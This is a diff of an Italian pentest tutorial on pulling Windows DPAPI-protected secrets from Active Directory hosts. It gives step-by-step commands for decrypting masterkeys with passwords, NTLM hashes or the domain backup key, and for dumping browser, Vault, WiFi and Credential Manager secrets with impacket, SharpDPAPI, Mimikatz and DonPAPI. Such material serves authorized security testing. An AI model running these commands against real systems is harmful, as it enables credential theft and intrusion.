@@ -14,6 +14,8 @@ tags:
   - dpapi
 ---
 
+# DPAPI — Guida Operativa Completa
+
 DPAPI (Data Protection API) è il meccanismo nativo di Windows per cifrare password, token e segreti legati all'identità dell'utente. Browser, Credential Manager, applicazioni di terze parti — tutto passa da qui.
 
 Durante un pentest AD è una delle fonti di credenziali più sottovalutate. Spesso trovi hash crackati, pass-the-hash, Kerberoasting — e intanto le password in chiaro sono lì, cifrate con DPAPI, che nessuno ha guardato.
@@ -22,26 +24,35 @@ Questa guida è operativa: ogni concetto ha il comando corrispondente.
 
 ***
 
-## TL;DR
+## Come funziona DPAPI — Dal blob alla password
 
-| Hai              | Fai                                                    |
-| ---------------- | ------------------------------------------------------ |
-| Password utente  | `dpapi.py masterkey -password` → `dpapi.py credential` |
-| Hash NTLM utente | `dpapi.py masterkey -password` (con pass crackato)     |
-| Domain Admin     | `dpapi.py backupkeys --export` → decripti chiunque     |
-| SYSTEM su box    | `SharpDPAPI credentials` in un colpo solo              |
+Prima di usare qualsiasi tool, capisci il flusso. Sono sempre 3 pezzi:
+
+```
+Password utente (o domain backup key)
+        ↓
+Decripta la Masterkey
+        ↓
+La Masterkey decripta il Blob/Credential file
+        ↓
+Password in chiaro
+```
+
+**Non puoi saltare nessuno step.** Se manca uno dei tre, non decripti nulla.
 
 ***
 
 ## Cos'è un blob DPAPI
 
-Un blob DPAPI è una **sequenza di byte che nasconde un segreto**. Può contenere una password, un token, una chiave — qualsiasi dato che un'applicazione Windows ha deciso di salvare in modo "sicuro".
+Un blob DPAPI è una **sequenza di byte cifrati che nasconde un segreto** — una password, un token, una chiave. Può contenere qualsiasi dato che un'applicazione Windows ha deciso di proteggere.
 
-Si riconosce dal magic bytes iniziale:
+Si riconosce dal magic bytes iniziale quando è in formato testo:
 
 ```
 01000000d08c9ddf0115d1118c7a00c04fc297eb...
 ```
+
+Quando è un file binario raw (come i Credential files di Windows), non lo vedi direttamente — devi leggerlo con un tool.
 
 Lo trovi in:
 
@@ -50,14 +61,65 @@ Lo trovi in:
 * Task Scheduler (file XML dei task)
 * `SYSVOL` — script GPO lasciati da admin negligenti
 
+### Come trovare blob DPAPI
+
+**Da Windows (shell/WinRM):**
+
+```powershell
+# Credential files — prima cosa da controllare sempre
+dir C:\Users\*\AppData\Local\Microsoft\Credentials\
+dir C:\Users\*\AppData\Roaming\Microsoft\Credentials\
+
+# Cerca blob raw nel filesystem (magic bytes in hex)
+Get-ChildItem -Path C:\ -Recurse -ErrorAction SilentlyContinue | Select-String -Pattern "01000000d08c9ddf" 2>$null
+
+# Cerca nei task schedulati
+dir C:\Windows\System32\Tasks\
+findstr /si "01000000d08c9ddf" C:\Windows\System32\Tasks\*
+
+# Cerca negli script GPO su SYSVOL
+findstr /si "01000000d08c9ddf" \\<DC>\SYSVOL\*
+```
+
+**Da Linux (share SMB montato o file scaricati):**
+
 ```bash
-# Cerca blob DPAPI su share SMB
 grep -r "01000000d08c9ddf" /mnt/smb/
+grep -r "01000000d08c9ddf" . 2>/dev/null
 ```
 
 ***
 
-## Cos'è una masterkey DPAPI
+## Cos'è un Credential file
+
+Il Credential file è il formato strutturato che Windows usa per salvare credenziali (RDP, reti, applicazioni). È un blob DPAPI in formato specifico.
+
+Dove si trovano:
+
+```powershell
+dir C:\Users\<utente>\AppData\Local\Microsoft\Credentials\
+dir C:\Users\<utente>\AppData\Roaming\Microsoft\Credentials\
+```
+
+**Come leggere un Credential file senza chiave** (per capire quale masterkey serve):
+
+```bash
+dpapi.py credential -file <CREDFILE>
+```
+
+Output:
+
+```
+[BLOB]
+Guid MasterKey   : 7DC6A492-36E2-4C2D-BE66-BA29D263DDA2   ← questo ti serve
+Description      : Local Credential Data
+```
+
+Il campo `Guid MasterKey` ti dice esattamente quale masterkey devi decriptare.
+
+***
+
+## Cos'è una Masterkey
 
 La masterkey è la **chiave che decripta il blob**. Ogni utente ne ha una o più, salvate qui:
 
@@ -65,134 +127,150 @@ La masterkey è la **chiave che decripta il blob**. Ogni utente ne ha una o più
 C:\Users\<utente>\AppData\Roaming\Microsoft\Protect\<SID>\
 ```
 
-Il blob contiene il GUID della masterkey usata per cifrarlo. Trovi la corrispondenza confrontando quel GUID con i file nella cartella `Protect`.
-
 ```powershell
-# Da WinRM/shell — elenca le masterkey dell'utente corrente
-dir C:\Users\dharding\AppData\Roaming\Microsoft\Protect\S-1-5-21-xxx\
+# Elenca le masterkey dell'utente
+dir -Force C:\Users\<utente>\AppData\Roaming\Microsoft\Protect\<SID>\
 ```
 
 Output tipico:
 
 ```
-5bc96c14-a85d-45d7-8568-80ff29215ca4   ← masterkey
-ca7e39cf-799d-4dbd-b42b-74e634df8113   ← altra masterkey
+7dc6a492-36e2-4c2d-be66-ba29d263dda2   ← masterkey
+847764c9-8c17-4732-ae85-438159038c97   ← altra masterkey
+BK-DOMINIO                              ← backup cifrato con chiave RSA del DC
 Preferred                               ← punta alla masterkey attiva
 ```
 
+### Come capire quale masterkey usare
+
+Hai due modi:
+
+**Metodo 1 — Leggi il Credential file** (il più preciso):
+
+```bash
+dpapi.py credential -file <CREDFILE>
+# Guarda il campo "Guid MasterKey"
+```
+
+**Metodo 2 — Leggi il file Preferred**:
+
+```powershell
+[System.BitConverter]::ToString([System.IO.File]::ReadAllBytes("C:\Users\<utente>\AppData\Roaming\Microsoft\Protect\<SID>\Preferred"))
+```
+
+Output: `C9-64-77-84-17-8C-32-47-AE-85-43-81-59-03-8C-97-...`
+
+I primi 16 byte in little-endian sono il GUID della masterkey attiva. Attenzione: `Preferred` punta all'ultima masterkey aggiornata, ma il blob può essere stato cifrato con una più vecchia. **Il Metodo 1 è sempre più affidabile.**
+
+### File speciali nella cartella Protect
+
+| File          | Cosa è                                                    |
+| ------------- | --------------------------------------------------------- |
+| `<GUID>`      | Masterkey dell'utente                                     |
+| `Preferred`   | Punta alla masterkey attiva (aggiornata ogni \~90 giorni) |
+| `BK-<DOMAIN>` | Backup cifrato con la chiave RSA del DC                   |
+
 ***
 
-## File speciali nella cartella Protect
+## TL;DR — Cosa ti serve per iniziare
 
-| File          | Cosa è                                                  |
-| ------------- | ------------------------------------------------------- |
-| `<GUID>`      | Masterkey dell'utente                                   |
-| `Preferred`   | Punta alla masterkey attiva (aggiornata ogni 90 giorni) |
-| `BK-<DOMAIN>` | Backup cifrato con la chiave RSA del DC                 |
+| Hai              | Fai                                               |
+| ---------------- | ------------------------------------------------- |
+| Password utente  | Tecnica 1                                         |
+| Hash NTLM utente | Tecnica 5                                         |
+| Domain Admin     | Tecnica 3 (domain backup key) — decripti chiunque |
+| SYSTEM sul box   | Tecnica 4 (SharpDPAPI) — tutto in un colpo        |
 
 ***
 
 ## Tecnica 1 — Password utente nota
 
-### Step 1 — Recupera il SID dell'utente
+### Step 1 — Trova i Credential files
 
 ```powershell
-# Da shell sul target
-whoami /user
+dir C:\Users\<utente>\AppData\Local\Microsoft\Credentials\
+dir C:\Users\<utente>\AppData\Roaming\Microsoft\Credentials\
 ```
 
-Output:
+### Step 2 — Leggi il Credential file per trovare il GUID della masterkey
 
-```
-dharding  S-1-5-21-3529848291-2371357972-1873374923-1001
+```bash
+dpapi.py credential -file <CREDFILE>
+# Annota il campo "Guid MasterKey"
 ```
 
-### Step 2 — Scarica la masterkey
+### Step 3 — Scarica la masterkey corrispondente
 
 ```powershell
 # Da Evil-WinRM
-download "C:\Users\dharding\AppData\Roaming\Microsoft\Protect\S-1-5-21-3529848291-2371357972-1873374923-1001\5bc96c14-a85d-45d7-8568-80ff29215ca4"
+download "C:\Users\<utente>\AppData\Roaming\Microsoft\Protect\<SID>\<GUID-masterkey>"
 ```
 
-### Step 3 — Decripta la masterkey
+### Step 4 — Recupera il SID dell'utente
+
+```powershell
+whoami /user
+```
+
+### Step 5 — Decripta la masterkey
 
 ```bash
 dpapi.py masterkey \
-  -file 5bc96c14-a85d-45d7-8568-80ff29215ca4 \
-  -sid S-1-5-21-3529848291-2371357972-1873374923-1001 \
-  -password WestminsterOrange17
+  -file <GUID-masterkey> \
+  -sid <SID> \
+  -password <PASSWORD>
 ```
 
 Output:
 
 ```
-Decrypted key with User Key (SHA1)
+Decrypted key with User Key (MD4 protected)
 Decrypted key: 0x32f235f8680f61b2886a31ab60651161...
 ```
 
-### Step 4 — Trova i file credenziali
-
-```powershell
-dir "C:\Users\dharding\AppData\Local\Microsoft\Credentials\"
-dir "C:\Users\dharding\AppData\Roaming\Microsoft\Credentials\"
-```
-
-WinPEAS li trova automaticamente e mostra anche il GUID della masterkey associata:
-
-```
-CredFile: C:\Users\dharding\AppData\Local\Microsoft\Credentials\DFBE70A7E5CC19A398EBF1B96859CE5D
-MasterKey: 5bc96c14-a85d-45d7-8568-80ff29215ca4
-```
-
-### Step 5 — Scarica e decripta il file credenziali
-
-```powershell
-download "C:\Users\dharding\AppData\Local\Microsoft\Credentials\DFBE70A7E5CC19A398EBF1B96859CE5D"
-```
+### Step 6 — Decripta il Credential file
 
 ```bash
-dpapi.py credential \
-  -f DFBE70A7E5CC19A398EBF1B96859CE5D \
-  -key 0x32f235f8680f61b2886a31ab60651161...
+dpapi.py credential -file <CREDFILE> -key 0x<MASTERKEY-DECRIPTATA>
 ```
 
-Output se c'è qualcosa di utile:
+Output:
 
 ```
 [CREDENTIAL]
-Target      : Domain:target=DOMAINCONTROLLER
-Username    : administrator
+Target      : Domain:target=FILESERVER01
+Username    : DOMAIN\administrator
+Password    : P@ssw0rd123
 ```
 
 ***
 
-## Tecnica 2 — Blob DPAPI raw (es. da script, registry, file)
+## Tecnica 2 — Blob DPAPI raw (da script, registry, file)
 
-Se il blob non è un file credenziali standard ma una stringa hex trovata in giro:
+Se trovi un blob come stringa hex (es. in uno script PowerShell o in un file XML):
 
 ### Step 1 — Converti da hex a binario
 
 ```bash
-# Se hai il blob come stringa hex in un file di testo
 xxd -r -p blob.txt blob.bin
 ```
 
-### Step 2 — Decripta con la masterkey
+### Step 2 — Leggi il blob per trovare il GUID della masterkey
 
 ```bash
-dpapi.py unprotect \
-  -file blob.bin \
-  -key 0x32f235f8680f61b2886a31ab60651161...
+dpapi.py unprotect -file blob.bin
+# Guarda il campo "Guid MasterKey"
 ```
 
-Output:
+### Step 3 — Decripta la masterkey (come Tecnica 1, Step 3-5)
 
-```
-Successfully decrypted data
-0000   68 00 48 00 4F 00 5F 00  53 00 39 00 67 00   h.H.O._.S.9.g.
+### Step 4 — Decripta il blob
+
+```bash
+dpapi.py unprotect -file blob.bin -key 0x<MASTERKEY-DECRIPTATA>
 ```
 
-> **Nota:** L'output è in UTF-16LE — ogni carattere ha `00` dopo. Leggi saltando i byte nulli: `hHO_S9g...`
+> **Nota:** L'output può essere in UTF-16LE — ogni carattere ha `00` dopo. Leggi saltando i byte nulli.
 
 ***
 
@@ -203,9 +281,7 @@ Il DC ha un backup di tutte le masterkey del dominio, cifrato con la sua chiave 
 ### Step 1 — Esporta la domain backup key
 
 ```bash
-dpapi.py backupkeys \
-  -t DOMINIO/Administrator:Password@192.168.1.1 \
-  --export
+dpapi.py backupkeys -t DOMINIO/Administrator:Password@<DC_IP> --export
 ```
 
 Output — tre file:
@@ -220,25 +296,98 @@ G$BCKUPKEY_<GUID>.key
 
 ```bash
 dpapi.py masterkey \
-  -file 5bc96c14-a85d-45d7-8568-80ff29215ca4 \
-  -sid S-1-5-21-xxx \
-  -pvk 'G$BCKUPKEY_xxx.pvk'
+  -file <GUID-masterkey> \
+  -sid <SID> \
+  -pvk G$BCKUPKEY_<GUID>.pvk
 ```
 
-Da qui in poi stesso flusso di Tecnica 1.
+Da qui in poi stesso flusso di Tecnica 1, Step 6.
 
 ***
 
 ## Tecnica 4 — SharpDPAPI (da shell SYSTEM)
 
-Se sei SYSTEM sul target, SharpDPAPI fa tutto in un colpo:
+Se sei SYSTEM sul target, SharpDPAPI fa tutto in un colpo senza dover scaricare file:
 
 ```powershell
-# Decripta tutti i file credenziali dell'utente corrente
+# Decripta tutti i Credential files dell'utente corrente
 .\SharpDPAPI.exe credentials
 
-# Decripta con masterkey esplicita
+# Con masterkey esplicita
 .\SharpDPAPI.exe credentials /mkfile:masterkeys.txt
+```
+
+***
+
+## Tecnica 5 — Masterkey con hash NTLM
+
+Se hai l'hash NTLM ma non la password in chiaro:
+
+```bash
+dpapi.py masterkey \
+  -file <GUID-masterkey> \
+  -sid <SID> \
+  -hash aad3b435b51404eeaad3b435b51404ee:<NTHASH>
+```
+
+***
+
+## Tecnica 6 — Windows Vault
+
+Il Vault salva credenziali di RDP, reti, applicazioni. Formato diverso dai Credential files.
+
+```powershell
+# Elenca vault sul target
+vaultcmd /list
+vaultcmd /listcreds:"Windows Credentials" /all
+
+# Scarica i file vault
+dir C:\Users\<utente>\AppData\Local\Microsoft\Vault\
+dir C:\ProgramData\Microsoft\Vault\
+```
+
+```bash
+dpapi.py vault \
+  -vcrd <file.vcrd> \
+  -vpol Policy.vpol \
+  -key 0x<MASTERKEY-DECRIPTATA>
+```
+
+***
+
+## Tecnica 7 — Chrome / Edge password
+
+Browser Chromium-based salvano le password cifrate con DPAPI dell'utente.
+
+```powershell
+download "C:\Users\<utente>\AppData\Local\Google\Chrome\User Data\Default\Login Data"
+download "C:\Users\<utente>\AppData\Local\Google\Chrome\User Data\Local State"
+```
+
+```bash
+dpapi.py chrome \
+  --logindata "Login Data" \
+  --localstate "Local State" \
+  -key 0x<MASTERKEY-DECRIPTATA>
+```
+
+> Edge usa lo stesso meccanismo — path: `Microsoft\Edge\User Data\Default\`.
+
+***
+
+## Tecnica 8 — Mimikatz da SYSTEM
+
+Se sei SYSTEM e riesci a far girare Mimikatz (attenzione all'AV):
+
+```
+# Dump tutte le masterkey dalla memoria LSASS
+sekurlsa::dpapi
+
+# Decripta un Credential file con masterkey trovata in memoria
+dpapi::cred /in:"C:\Users\<utente>\AppData\Local\Microsoft\Credentials\<CREDFILE>"
+
+# Decripta con masterkey esplicita
+dpapi::cred /in:"C:\...\<CREDFILE>" /masterkey:<MASTERKEY-HEX>
 ```
 
 ***
@@ -248,10 +397,7 @@ Se sei SYSTEM sul target, SharpDPAPI fa tutto in un colpo:
 Le password WiFi sono cifrate con DPAPI di SYSTEM. Se sei admin:
 
 ```powershell
-# Esporta tutti i profili WiFi in chiaro
 netsh wlan export profile folder=C:\temp key=clear
-
-# Leggi la password
 type C:\temp\Wi-Fi-*.xml | findstr "keyMaterial"
 ```
 
@@ -265,206 +411,120 @@ Output:
 
 ## Tecnica 10 — Credential Manager (cmdkey)
 
-Elenca le credenziali salvate senza scaricare nulla:
-
 ```powershell
 cmdkey /list
 ```
 
-Output tipico:
-
-```
-Currently stored credentials:
-  Target: Domain:target=FILESERVER01
-  Type: Domain Password
-  User: DOMAIN\administrator
-```
-
-Se vedi credenziali interessanti, quelle sono nei file Credentials — usa il flusso Tecnica 1 per decriptarle.
+Se vedi credenziali interessanti, quelle sono nei Credential files — usa Tecnica 1.
 
 ***
 
 ## Tecnica 11 — Sticky Notes
 
-Spesso dimenticate dagli admin. Cifrate con DPAPI, salvate in un database SQLite.
+Spesso dimenticate dagli admin. Cifrate con DPAPI.
 
 ```powershell
-# Path del database
-dir "C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\"
-download "C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite"
+dir "C:\Users\<utente>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\"
+download "...\plum.sqlite"
 ```
 
 ```bash
-# Da Linux — leggi il contenuto
 sqlite3 plum.sqlite "SELECT Text FROM Note;"
 ```
-
-> Il testo può contenere password scritte a mano dall'utente — capitano più spesso di quanto pensi.
-
-***
-
-## Errori comuni
-
-| Errore                              | Causa                                           | Fix                                            |
-| ----------------------------------- | ----------------------------------------------- | ---------------------------------------------- |
-| `Padding is incorrect`              | Masterkey sbagliata                             | Prova l'altra masterkey nella cartella         |
-| `Unable to decrypt masterkey`       | Password o SID errati                           | Verifica SID con `whoami /user`                |
-| Output vuoto `[CREDENTIAL]`         | File credenziali di Windows Live                | Inutile, cerca altri file                      |
-| `Cannot find masterkey`             | GUID nel blob non corrisponde ai file scaricati | Scarica tutti i file nella cartella `Protect`  |
-| `Access Denied` su cartella Protect | Non sei l'utente proprietario o non sei SYSTEM  | Usa `SeBackupPrivilege` o SharpDPAPI da SYSTEM |
 
 ***
 
 ## Dove cercare in un pentest reale
 
-```
-C:\Users\*\AppData\Local\Microsoft\Credentials\*
-C:\Users\*\AppData\Roaming\Microsoft\Credentials\*
-C:\Users\*\Documents\*.txt
-C:\Scripts\*
-\\DC\SYSVOL\*\scripts\*
-Task Scheduler: C:\Windows\System32\Tasks\*
-```
+```powershell
+# Credential files
+dir C:\Users\*\AppData\Local\Microsoft\Credentials\*
+dir C:\Users\*\AppData\Roaming\Microsoft\Credentials\*
 
-Stringa da cercare nei file:
+# Blob DPAPI in giro per il filesystem
+dir C:\Scripts\*
+dir \\DC\SYSVOL\*\scripts\*
+dir C:\Windows\System32\Tasks\*
+```
 
 ```bash
+# Da Linux su share SMB montato
 grep -r "01000000d08c9ddf" . 2>/dev/null
 ```
 
 ***
 
-## Attack Chain tipica
+## Errori comuni
 
-```
-Password utente
-      ↓
-dpapi.py masterkey → Decrypted key
-      ↓
-dpapi.py credential → Username/Password
-      ↓
-Lateral movement / Privilege escalation
-```
+| Errore                              | Causa                                               | Fix                                                                                                               |
+| ----------------------------------- | --------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------- |
+| `Padding is incorrect`              | Masterkey sbagliata — stai usando il GUID sbagliato | Leggi prima il blob con `dpapi.py credential -file <CREDFILE>` e usa il GUID che trovi nel campo `Guid MasterKey` |
+| `Unable to decrypt masterkey`       | Password o SID errati                               | Verifica SID con `whoami /user`                                                                                   |
+| Output vuoto `[CREDENTIAL]`         | File credenziali di Windows Live                    | Inutile, cerca altri file                                                                                         |
+| `Cannot find masterkey`             | GUID nel blob non corrisponde ai file scaricati     | Scarica tutti i file nella cartella `Protect`                                                                     |
+| `Access Denied` su cartella Protect | Non sei l'utente proprietario o non sei SYSTEM      | Usa `SeBackupPrivilege` o SharpDPAPI da SYSTEM                                                                    |
 
 ***
 
-## Tecnica 5 — Masterkey con hash NTLM (senza password in chiaro)
-
-Se hai l'hash NTLM ma non la password:
+## Cheat Sheet
 
 ```bash
-dpapi.py masterkey \
-  -file 5bc96c14-a85d-45d7-8568-80ff29215ca4 \
-  -sid S-1-5-21-xxx \
-  -hash aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4
-```
+# Leggi blob/credential senza chiave (per trovare il GUID masterkey)
+dpapi.py credential -file <CREDFILE>
+dpapi.py unprotect -file blob.bin
 
-***
-
-## Tecnica 6 — Windows Vault
-
-Diverso dai file Credentials standard. Il Vault salva credenziali di RDP, reti, applicazioni.
-
-```powershell
-# Elenca vault sul target
-vaultcmd /list
-vaultcmd /listcreds:"Windows Credentials" /all
-```
-
-```powershell
-# Scarica i file vault
-dir C:\Users\<user>\AppData\Local\Microsoft\Vault\
-dir C:\ProgramData\Microsoft\Vault\
-```
-
-```bash
-# Decripta da Linux
-dpapi.py vault \
-  -vcrd <file.vcrd> \
-  -vpol <Policy.vpol> \
-  -key 0x32f235f8...
-```
-
-***
-
-## Tecnica 7 — Chrome / Edge password
-
-Browser Chromium-based salvano le password cifrate con DPAPI dell'utente.
-
-```powershell
-# File da scaricare
-download "C:\Users\<user>\AppData\Local\Google\Chrome\User Data\Default\Login Data"
-download "C:\Users\<user>\AppData\Local\Google\Chrome\User Data\Local State"
-```
-
-```bash
-# Decripta con impacket
-dpapi.py chrome \
-  --logindata "Login Data" \
-  --localstate "Local State" \
-  -key 0x32f235f8...
-```
-
-> Edge usa lo stesso meccanismo — sostituisci il path con `Microsoft\Edge\User Data\Default\`.
-
-***
-
-## Tecnica 8 — Mimikatz da SYSTEM (tutto in memoria)
-
-Se sei SYSTEM, Mimikatz decripta senza toccare file su disco:
-
-```
-# Dump tutte le masterkey in memoria
-sekurlsa::dpapi
-
-# Decripta file credenziali specifico
-dpapi::cred /in:"C:\Users\dharding\AppData\Local\Microsoft\Credentials\DFBE70A7E5CC19A398EBF1B96859CE5D"
-
-# Decripta con masterkey esplicita
-dpapi::cred /in:"C:\...\DFBE70..." /masterkey:32f235f8680f61b2886a31ab...
-```
-
-***
-
-## Tool
-
-* [impacket dpapi.py](https://github.com/fortra/impacket) — flusso completo da Linux
-* [SharpDPAPI](https://github.com/GhostPack/SharpDPAPI) — da eseguire direttamente su Windows
-* [Mimikatz dpapi::](https://github.com/gentilkiwi/mimikatz) — alternativa se hai SYSTEM
-
-***
-
-## Cheat Sheet comandi DPAPI
-
-```bash
-# 1. Decripta masterkey con password
+# Decripta masterkey con password
 dpapi.py masterkey -file <GUID> -sid <SID> -password <PASS>
 
-# 2. Decripta masterkey con hash NTLM
+# Decripta masterkey con hash NTLM
 dpapi.py masterkey -file <GUID> -sid <SID> -hash <NTLM>
 
-# 3. Decripta masterkey con domain backup key
+# Decripta masterkey con domain backup key
 dpapi.py masterkey -file <GUID> -sid <SID> -pvk <FILE.pvk>
 
-# 4. Decripta file credenziali
-dpapi.py credential -f <CREDFILE> -key 0x<MASTERKEY>
+# Decripta Credential file
+dpapi.py credential -file <CREDFILE> -key 0x<MASTERKEY>
 
-# 5. Decripta blob raw
-xxd -r -p blob.txt blob.bin
+# Decripta blob raw
 dpapi.py unprotect -file blob.bin -key 0x<MASTERKEY>
 
-# 6. Decripta Chrome
+# Decripta Chrome
 dpapi.py chrome --logindata "Login Data" --localstate "Local State" -key 0x<MASTERKEY>
 
-# 7. Decripta vault
+# Decripta vault
 dpapi.py vault -vcrd <FILE.vcrd> -vpol <Policy.vpol> -key 0x<MASTERKEY>
 
-# 8. Esporta domain backup key
-dpapi.py backupkeys -t DOMAIN/Admin:Pass@DC_IP --export
+# Esporta domain backup key
+dpapi.py backupkeys -t DOMAIN/Admin:Pass@<DC_IP> --export
 
-# 9. SharpDPAPI tutto in uno (da SYSTEM)
+# SharpDPAPI tutto in uno (da SYSTEM)
 .\SharpDPAPI.exe credentials
 ```
+
+***
+
+## Tecnica 12 — Account di servizio (gMSA / Service Accounts)
+
+Gli account di servizio possono avere blob DPAPI associati — credenziali salvate da applicazioni che girano sotto quell'account.
+
+```powershell
+# Trova blob degli account di servizio
+dir C:\Windows\ServiceProfiles\*\AppData\Local\Microsoft\Credentials\
+dir C:\Windows\ServiceProfiles\*\AppData\Roaming\Microsoft\Credentials\
+dir C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials\
+```
+
+Per decriptarli ti serve la masterkey di SYSTEM (non dell'utente):
+
+```bash
+# Da SYSTEM — SharpDPAPI decripta anche i blob di servizio
+.\SharpDPAPI.exe credentials /machine
+
+# Con impacket — serve la LSA machine key
+dpapi.py masterkey -file <GUID> -system <SYSTEM-KEY>
+```
+
+> La SYSTEM key si ottiene da `lsadump::lsa /patch` in Mimikatz o da secretsdump.
 
 ***
 
@@ -477,39 +537,100 @@ dpapi.py backupkeys -t DOMAIN/Admin:Pass@DC_IP --export
 | `sekurlsa::dpapi` Mimikatz   | LSASS memory read     | 10 (Sysmon) |
 | Export profili WiFi          | `netsh` process spawn | 4688        |
 
-**Indicatori di compromissione:**
+***
 
-* Accesso alla cartella `Protect` da processo non `lsass.exe`
-* Lettura massiva di file in `C:\Users\*\AppData\Local\Microsoft\Credentials\`
-* Connessione LDAP al DC per `backupkeys` (porta 389/636)
+## Tool
+
+* [impacket dpapi.py](https://github.com/fortra/impacket) — flusso completo da Linux
+* [SharpDPAPI](https://github.com/GhostPack/SharpDPAPI) — da eseguire su Windows
+* [DonPAPI](https://github.com/login-securite/DonPAPI) — automatizza tutto in remoto
+* [Mimikatz dpapi::](https://github.com/gentilkiwi/mimikatz) — da SYSTEM in memoria
+* [HackTricks — DPAPI](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dpapi-extracting-passwords) — riferimento esterno completo
 
 ***
 
-## FAQ
+## Cheat Sheet Finale — Solo Comandi
 
-**Cos'è DPAPI in Windows?**
-È l'API nativa di Windows per cifrare e decifrare dati sensibili legati all'identità dell'utente. Usata da browser, credential manager, applicazioni di terze parti.
+### 1. Trovare i blob/credential files
 
-**Come decriptare credenziali DPAPI senza la password dell'utente?**
-Con la domain backup key del DC (se sei Domain Admin) o con l'hash NTLM dell'utente.
+```powershell
+# Windows — credential files
+dir C:\Users\*\AppData\Local\Microsoft\Credentials\
+dir C:\Users\*\AppData\Roaming\Microsoft\Credentials\
 
-**Dove sono le masterkey DPAPI in Windows?**
-In `C:\Users\<utente>\AppData\Roaming\Microsoft\Protect\<SID>\` — una o più file con nome GUID.
+# Windows — blob raw nel filesystem
+findstr /si "01000000d08c9ddf" C:\Scripts\*
+findstr /si "01000000d08c9ddf" C:\Windows\System32\Tasks\*
+findstr /si "01000000d08c9ddf" \\<DC>\SYSVOL\*
 
-**DPAPI funziona su utenti di dominio?**
-Sì. Gli utenti di dominio hanno masterkey cifrate anche con la domain backup key del DC, il che le rende decriptabili senza la password originale.
+# Linux
+grep -r "01000000d08c9ddf" . 2>/dev/null
+```
 
-**Qual è la differenza tra file Credentials e blob DPAPI?**
-I file Credentials sono un formato strutturato (Target, Username, Password). Un blob DPAPI è un dato cifrato generico che puoi trovare ovunque — file, registry, task XML. Il flusso di decryption è simile ma il comando finale cambia.
+### 2. Leggere il blob per trovare il GUID masterkey
 
-**WinPEAS trova automaticamente i file DPAPI?**
-Sì — cerca nella sezione `DPAPI Credential Files` e mostra il GUID della masterkey associata a ogni file.
+```bash
+dpapi.py credential -file <CREDFILE>
+dpapi.py unprotect -file blob.bin
+# → annota "Guid MasterKey"
+```
 
-***
+### 3. Trovare il SID utente
 
-## Approfondimenti
+```powershell
+whoami /user
+```
 
-* [ADCS ESC1/ESC8 — Certificati AD](https://hackita.it/articoli/adcs-esc1-esc16)
-* [Kerberoasting](https://hackita.it/articoli/kerberoasting)
-* [BloodHound — Enumerazione AD](https://hackita.it/articoli/bloodhound)
-* [Pass the Hash](https://hackita.it/articoli/pass-the-hash)
+### 4. Scaricare la masterkey giusta
+
+```powershell
+# Download da Evil-WinRM
+download "C:\Users\<utente>\AppData\Roaming\Microsoft\Protect\<SID>\<GUID>"
+```
+
+### 5. Decriptare la masterkey
+
+```bash
+# Con password
+dpapi.py masterkey -file <GUID> -sid <SID> -password <PASS>
+
+# Con hash NTLM
+dpapi.py masterkey -file <GUID> -sid <SID> -hash <LMHASH>:<NTHASH>
+
+# Con domain backup key
+dpapi.py masterkey -file <GUID> -sid <SID> -pvk <FILE.pvk>
+```
+
+### 6. Decriptare il blob/credential
+
+```bash
+# Credential file
+dpapi.py credential -file <CREDFILE> -key 0x<MASTERKEY>
+
+# Blob raw
+dpapi.py unprotect -file blob.bin -key 0x<MASTERKEY>
+
+# Chrome/Edge
+dpapi.py chrome --logindata "Login Data" --localstate "Local State" -key 0x<MASTERKEY>
+
+# Vault
+dpapi.py vault -vcrd <FILE.vcrd> -vpol Policy.vpol -key 0x<MASTERKEY>
+```
+
+### 7. Shortcut — Tutto in uno
+
+```bash
+# Domain backup key (DA richiesto)
+dpapi.py backupkeys -t DOMAIN/Admin:Pass@<DC_IP> --export
+
+# DonPAPI in remoto
+donpapi collect -u <USER> -p <PASS> -d <DOMAIN> -t <IP>
+donpapi collect -u <USER> -H <NTHASH> -d <DOMAIN> -t <IP>
+
+# DonPAPI con local-auth (admin locale, senza dominio)
+donpapi collect -u Administrator -p <PASS> -t <IP>
+donpapi collect -u Administrator -H <NTHASH> -t <IP>
+
+# SharpDPAPI da SYSTEM sul target
+.\SharpDPAPI.exe credentials
+```
